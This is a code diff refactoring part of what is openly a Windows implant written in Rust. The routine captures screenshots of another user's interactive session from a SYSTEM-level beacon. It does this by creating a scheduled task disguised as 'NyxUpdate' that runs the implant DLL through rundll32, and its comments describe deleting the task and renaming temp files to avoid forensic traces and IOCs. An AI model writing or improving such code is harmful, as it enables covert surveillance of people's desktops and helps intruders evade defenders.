@@ -1034,46 +1034,23 @@ fn format_err(c: u8) -> String {
 /// `nyx_shot.bmp` name was a durable IOC.
 const SHOT_TEMP: &[u8] = b"C:\\Windows\\Temp\\~dfftmp.bmp\0";
 
-unsafe fn cross_session_capture() -> Option<Vec<u8>> {
-    // Default step code = "an export could not be resolved" (8). The explicit
-    // failure points below (1/2/3/5/6/7) overwrite this once they're reached,
-    // so any `?` early-return from an unresolved export_addr surfaces as step 8
-    // rather than step 0 ("unknown"). This is the documented diagnostic
-    // contract: 8 = export resolution failed somewhere in this function.
-    unsafe {
-        XSESS_FAIL = 8;
-    }
+// ── Cross-session capture helpers ──────────────────────────────────────────
 
-    // 1. Find an active interactive session (RDP or console). We enumerate all
-    //    sessions via WTSEnumerateSessions and pick the first WTSActive one
-    //    (State==0). WTSGetActiveConsoleSessionId only returns the PHYSICAL
-    //    console — useless when the user is on RDP (session 2+), which is the
-    //    common server case.
+/// Find the first active interactive session ID via WTSEnumerateSessionsW.
+/// Returns None if no active session exists or the WTS API is unavailable.
+unsafe fn find_active_session() -> Option<u32> {
     let lla: unsafe extern "system" fn(*const u8) -> *mut c_void =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"LoadLibraryA")?) };
     if unsafe { lla(b"wtsapi32.dll\0".as_ptr()) }.is_null() {
-        unsafe {
-            XSESS_FAIL = 2;
-        }
+        unsafe { XSESS_FAIL = 2; }
         return None;
     }
-    // WTS_CURRENT_SERVER_HANDLE = NULL (the local RDSS).
     type WTSEnumerateSessionsW = unsafe extern "system" fn(
-        *mut c_void,  // hServer (NULL = local)
-        u32,          // Reserved (0)
-        u32,          // Version (1)
-        *mut *mut u8, // ppSessionInfo
-        *mut u32,     // pCount
+        *mut c_void, u32, u32, *mut *mut u8, *mut u32,
     ) -> i32;
     type WTSFreeMemory = unsafe extern "system" fn(*mut c_void);
-    // WTS_SESSION_INFOA: { DWORD SessionId; LPSTR pWinStationName; DWORD State }
-    // State: 0=Active, 1=Connected, 4=Disconnected, ...
     #[repr(C)]
-    struct WtsSessionInfo {
-        session_id: u32,
-        win_station: *const u8,
-        state: u32,
-    }
+    struct WtsSessionInfo { session_id: u32, win_station: *const u8, state: u32 }
     let enum_sessions: WTSEnumerateSessionsW =
         unsafe { core::mem::transmute(export_addr(b"wtsapi32.dll", b"WTSEnumerateSessionsW")?) };
     let free_mem: WTSFreeMemory =
@@ -1083,52 +1060,36 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     if unsafe { enum_sessions(core::ptr::null_mut(), 0, 1, &mut buf, &mut count) } == 0
         || buf.is_null()
     {
-        unsafe {
-            XSESS_FAIL = 1;
-        }
+        unsafe { XSESS_FAIL = 1; }
         return None;
     }
-    // Scan for the first Active (state 0) session.
     let sessions =
         unsafe { core::slice::from_raw_parts(buf as *const WtsSessionInfo, count as usize) };
     let active_sid = sessions.iter().find(|s| s.state == 0).map(|s| s.session_id);
     unsafe { free_mem(buf as *mut c_void) };
-    let sid = match active_sid {
-        Some(s) => s,
-        None => {
-            unsafe {
-                XSESS_FAIL = 1;
-            }
-            return None;
-        } // no active session
-    };
+    match active_sid {
+        Some(s) => Some(s),
+        None => { unsafe { XSESS_FAIL = 1; } None }
+    }
+}
 
-    // 2. Resolve the active session's user for the schtasks `/ru` principal.
-    //    As SYSTEM, `schtasks /create /it` WITHOUT /ru fails with
-    //    (40,4):UserId "no mapping between account names and security IDs" —
-    //    the scheduler cannot derive an interactive principal from the SYSTEM
-    //    context (verified on the real target: create_exit=1). With
-    //    `/ru <user> /it` (no /rp) the task gets an interactive-token
-    //    principal: it runs as that user, in THEIR session, while they're
-    //    logged on — exactly where the desktop lives. We do NOT steal
-    //    explorer's token, need SeDebugPrivilege, or call
-    //    CreateProcess{AsUser,WithToken}W — all of those failed on a
-    //    privilege-constrained host (CPAU needs SeAssignPrimaryToken, CPWT was
-    //    rejected by the target desktop's ACL).
-    // WTSQuerySessionInformationW(hServer, SessionId, WTSInfoClass, ppBuffer,
-    // pBytesReturned) -> BOOL. WTS_INFO_CLASS: WTSUserName=5, WTSDomainName=7.
+/// Query the active session's user and domain names via WTSQuerySessionInformationW.
+/// Returns the schtasks /ru principal string: "DOMAIN\\user" or bare "user".
+unsafe fn query_session_user(sid: u32) -> crate::heap::Vec<u16> {
     type WTSQuerySessionInfoW = unsafe extern "system" fn(
-        *mut c_void,
-        u32,
-        u32,
-        *mut *mut u16,
-        *mut u32,
+        *mut c_void, u32, u32, *mut *mut u16, *mut u32,
     ) -> i32;
-    let query_si: WTSQuerySessionInfoW = unsafe {
-        core::mem::transmute(export_addr(b"wtsapi32.dll", b"WTSQuerySessionInformationW")?)
+    let query_si_addr = match unsafe { export_addr(b"wtsapi32.dll", b"WTSQuerySessionInformationW") } {
+        Some(a) => a,
+        None => return crate::heap::Vec::new(),
     };
-    // Returned buffers are UTF-16, byte count includes the trailing NUL, and
-    // must be freed with WTSFreeMemory.
+    let query_si: WTSQuerySessionInfoW = unsafe { core::mem::transmute(query_si_addr) };
+    let free_mem_addr = match unsafe { export_addr(b"wtsapi32.dll", b"WTSFreeMemory") } {
+        Some(a) => a,
+        None => return crate::heap::Vec::new(),
+    };
+    let free_mem: unsafe extern "system" fn(*mut c_void) =
+        unsafe { core::mem::transmute(free_mem_addr) };
     let query_str = |class: u32| -> crate::heap::Vec<u16> {
         let mut p: *mut u16 = core::ptr::null_mut();
         let mut bytes: u32 = 0;
@@ -1136,20 +1097,15 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
         if unsafe { query_si(core::ptr::null_mut(), sid, class, &mut p, &mut bytes) } != 0
             && !p.is_null()
         {
-            let slice =
-                unsafe { core::slice::from_raw_parts(p, (bytes as usize) / 2) };
+            let slice = unsafe { core::slice::from_raw_parts(p, (bytes as usize) / 2) };
             out.extend_from_slice(slice);
-            while out.last() == Some(&0) {
-                out.pop();
-            }
+            while out.last() == Some(&0) { out.pop(); }
             unsafe { free_mem(p as *mut c_void) };
         }
         out
     };
     let user = query_str(5);
     let domain = query_str(7);
-    // "DOMAIN\user" when a domain is present, bare user otherwise. schtasks
-    // resolves both local ("HOST\user" / "user") and domain principals.
     let mut runas: crate::heap::Vec<u16> = crate::heap::Vec::new();
     if !user.is_empty() {
         if !domain.is_empty() {
@@ -1158,17 +1114,13 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
         }
         runas.extend_from_slice(&user);
     }
+    runas
+}
 
-    // 3. Resolve the DLL path. Try GetModuleHandleExW(FROM_ADDRESS) first (finds
-    //    the DLL containing this fn); on failure fall back to the canonical
-    //    deployment path C:\nyx\nyx_implant_win.dll (where the beacon installs it).
-    // NOTE: backslashes must be escaped in byte literals — the prior
-    // `b"C:\nyx\nyx_implant_win.dll"` was two embedded LF chars (\n → 0x0A),
-    // producing an invalid path that only ever fired in exactly the PIC
-    // deployment where this fallback is needed. Corrected below.
+/// Resolve the implant DLL path via GetModuleHandleExW, falling back to the
+/// canonical deployment path C:\\nyx\\nyx_implant_win.dll.
+unsafe fn resolve_dll_path() -> crate::heap::Vec<u16> {
     let canonical: &[u8] = b"C:\\nyx\\nyx_implant_win.dll";
-    let mut dpath: crate::heap::Vec<u16> = crate::heap::Vec::new();
-    let mut resolved = false;
     if let (Some(ghex), Some(gmfn)) = (
         unsafe { export_addr(b"kernel32.dll", b"GetModuleHandleExW") },
         unsafe { export_addr(b"kernel32.dll", b"GetModuleFileNameW") },
@@ -1184,119 +1136,67 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
             let n = unsafe { gmfn(hmod, buf.as_mut_ptr(), 520) };
             if n > 0 {
                 buf.truncate(n as usize);
-                dpath = buf;
-                resolved = true;
+                return buf;
             }
         }
     }
-    if !resolved {
-        for &b in canonical {
-            dpath.push(b as u16);
-        }
-    }
+    let mut dpath: crate::heap::Vec<u16> = crate::heap::Vec::new();
+    for &b in canonical { dpath.push(b as u16); }
+    dpath
+}
 
-    // Pre-clean: delete any BMP left over from a PRIOR run before we spawn the
-    // helper. Without this, a stale file can be read back as if it were the
-    // fresh capture (dangerous fallback to cached data) when the helper fails to
-    // write. del_file is best-effort (may fail if locked); we don't gate on it.
-    let _ = del_file(SHOT_TEMP);
-
-    // 4. Build the helper command line: rundll32 <dll>,nyx_screenshot_session.
-    //    This is the string we hand to schtasks as `/tr`. NUL-terminated UTF-16.
-    //    (No surrounding quotes — schtasks /tr wraps it; the DLL path has no
-    //    spaces in the canonical deployment path C:\nyx\... . If a future
-    //    deployment path contains spaces this will need quoting.)
-    let mut helper_cmd: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(80 + dpath.len());
-    for &by in b"C:\\Windows\\System32\\rundll32.exe " {
-        helper_cmd.push(by as u16);
-    }
-    cmd_extend_wide(&mut helper_cmd, &dpath);
-    for &by in b",nyx_screenshot_session" {
-        helper_cmd.push(by as u16);
-    }
-
-    // 5. Spawn the helper via the Task Scheduler service. The one-shot task
-    //    runs as the ACTIVE SESSION's user (`/ru <user> /it`, resolved in step
-    //    2) with an interactive-token principal — the helper therefore lands in
-    //    that session's desktop even from a Session-0 SYSTEM beacon. The
-    //    scheduler service (svchost, SYSTEM) has the privileges to attach the
-    //    new process to the target session's WinSta0\default — exactly what the
-    //    token-based APIs could NOT do on a privilege-constrained host (CPAU
-    //    needs SeAssignPrimaryToken, CPWT was rejected by the desktop ACL).
-    //    Verified on the real target: /it WITHOUT /ru fails from SYSTEM with
-    //    (40,4):UserId "no mapping between account names and security IDs";
-    //    with /ru <session-user> this path produces a valid BMP.
-    //
-    //    A pseudo-random task name (NyxUpdateNNNN) avoids collisions with
-    //    concurrent screenshot calls and masquerades as an update task. We use
-    //    GetTickCount for entropy (cheap, always available).
+/// Create a one-shot scheduled task that runs the screenshot helper in the
+/// active session, trigger it, and poll for the BMP result.
+/// Returns the BMP bytes on success, or None with XSESS_FAIL set.
+unsafe fn run_screenshot_task(
+    runas: &[u16],
+    dpath: &[u16],
+) -> Option<Vec<u8>> {
+    // Build task name: NyxUpdate + random 1000-9999 suffix.
     let mut task_name: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(24);
-    for &by in b"NyxUpdate" {
-        task_name.push(by as u16);
-    }
+    for &by in b"NyxUpdate" { task_name.push(by as u16); }
     let gtc: unsafe extern "system" fn() -> u32 =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"GetTickCount")?) };
     let seed = unsafe { gtc() };
-    push_dec_u16(&mut task_name, ((seed % 9000) + 1000) as u16); // 1000–9999
+    push_dec_u16(&mut task_name, ((seed % 9000) + 1000) as u16);
 
-    // schtasks /create /tn <name> /tr "<helper>" /sc once /st 23:59 /it [/ru "<runas>"] /f
-    // `/ru <session-user>` is REQUIRED from a SYSTEM beacon — without it the
-    // scheduler can't map SYSTEM to an interactive principal ((40,4):UserId).
-    // If the username query failed we fall back to the old /it-only form,
-    // which still works from a user-context beacon.
+    // Build helper command: rundll32 <dll>,nyx_screenshot_session.
+    let mut helper_cmd: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(80 + dpath.len());
+    for &by in b"C:\\Windows\\System32\\rundll32.exe " { helper_cmd.push(by as u16); }
+    cmd_extend_wide(&mut helper_cmd, dpath);
+    for &by in b",nyx_screenshot_session" { helper_cmd.push(by as u16); }
+
+    // Build schtasks /create command.
     let mut create_cmd = crate::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
-    for &by in b"schtasks /create /tn " {
-        create_cmd.push(by as u16);
-    }
+    for &by in b"schtasks /create /tn " { create_cmd.push(by as u16); }
     create_cmd.extend_from_slice(&task_name);
-    for &by in b" /tr \"" {
-        create_cmd.push(by as u16);
-    }
+    for &by in b" /tr \"" { create_cmd.push(by as u16); }
     create_cmd.extend_from_slice(&helper_cmd);
-    for &by in b"\" /sc once /st 23:59 /it" {
-        create_cmd.push(by as u16);
-    }
+    for &by in b"\" /sc once /st 23:59 /it" { create_cmd.push(by as u16); }
     if !runas.is_empty() {
-        for &by in b" /ru \"" {
-            create_cmd.push(by as u16);
-        }
-        create_cmd.extend_from_slice(&runas);
+        for &by in b" /ru \"" { create_cmd.push(by as u16); }
+        create_cmd.extend_from_slice(runas);
         create_cmd.push(b'"' as u16);
     }
-    for &by in b" /f\0" {
-        create_cmd.push(by as u16);
-    }
+    for &by in b" /f\0" { create_cmd.push(by as u16); }
     if !unsafe { run_cmd_wait(create_cmd.as_mut_ptr()) } {
-        unsafe {
-            XSESS_FAIL = 5;
-        }
-        // Best-effort cleanup of a half-created task before bailing.
+        unsafe { XSESS_FAIL = 5; }
         let _ = unsafe { delete_task(&task_name) };
         return None;
     }
 
-    // 6. Trigger the task. The scheduler launches the helper asynchronously into
-    //    the active session; we can't WaitForSingleObject on it (we don't get a
-    //    handle), so we poll the BMP file below.
+    // Trigger the task.
     let mut run_cmd = crate::heap::Vec::<u16>::with_capacity(64 + task_name.len());
-    for &by in b"schtasks /run /tn " {
-        run_cmd.push(by as u16);
-    }
+    for &by in b"schtasks /run /tn " { run_cmd.push(by as u16); }
     run_cmd.extend_from_slice(&task_name);
     run_cmd.push(0);
     if !unsafe { run_cmd_wait(run_cmd.as_mut_ptr()) } {
-        unsafe {
-            XSESS_FAIL = 5;
-        }
+        unsafe { XSESS_FAIL = 5; }
         let _ = unsafe { delete_task(&task_name) };
         return None;
     }
 
-    // 7. Poll for the BMP. The scheduler starts the helper asynchronously, so we
-    //    can't wait on a process handle. Poll up to ~15s (Sleep 250ms × 60),
-    //    reading the file only once it's fully written. read_file validates the
-    //    BMP (BM magic + declared-size == actual), so a partial/truncated file
-    //    from a still-writing helper is rejected and we keep polling.
+    // Poll for BMP (up to ~15s, 250ms × 60).
     let sleep_fn: unsafe extern "system" fn(u32) =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"Sleep")?) };
     let mut bmp: Option<Vec<u8>> = None;
@@ -1307,24 +1207,41 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
             break;
         }
     }
-    // Always delete the task (success or timeout) — a lingering NyxUpdateNNNN
-    // task is a forensic footprint. Best-effort.
     let _ = unsafe { delete_task(&task_name) };
     match bmp {
         Some(b) => Some(b),
         None => {
-            // Either the helper never produced a BMP (capture failed in the
-            // interactive session — e.g. no desktop attached) or it didn't
-            // finish within 15s. Distinguish via step code: 7 = timeout, 6 =
-            // helper finished but no valid BMP. We can't tell the helper's exit
-            // code without a handle, so report timeout here.
             let _ = del_file(SHOT_TEMP);
-            unsafe {
-                XSESS_FAIL = 7;
-            }
+            unsafe { XSESS_FAIL = 7; }
             None
         }
     }
+}
+
+// ── Cross-session capture orchestrator ─────────────────────────────────────
+
+unsafe fn cross_session_capture() -> Option<Vec<u8>> {
+    // Default: export resolution failed (step 8). Explicit failure points
+    // overwrite this.
+    unsafe { XSESS_FAIL = 8; }
+
+    // 1. Find an active interactive session (RDP or console).
+    let sid = match find_active_session() {
+        Some(s) => s,
+        None => return None,
+    };
+
+    // 2. Resolve the session's user for schtasks /ru principal.
+    let runas = query_session_user(sid);
+
+    // 3. Resolve the implant DLL path.
+    let dpath = resolve_dll_path();
+
+    // 4. Pre-clean any stale BMP from a prior run.
+    let _ = del_file(SHOT_TEMP);
+
+    // 5–7. Create task, trigger, poll for result.
+    run_screenshot_task(&runas, &dpath)
 }
 
 /// Run a NUL-terminated UTF-16 command line via `cmd.exe /C` in the current
